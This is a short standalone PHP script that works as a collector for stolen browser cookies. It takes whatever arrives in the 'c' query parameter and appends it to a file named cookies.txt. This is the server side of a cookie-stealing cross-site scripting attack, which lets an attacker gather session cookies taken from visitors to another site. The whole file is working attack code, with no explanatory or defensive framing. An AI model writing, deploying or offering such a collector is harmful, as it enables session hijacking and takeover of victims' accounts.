<?php
$cookie = $_GET['c'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>
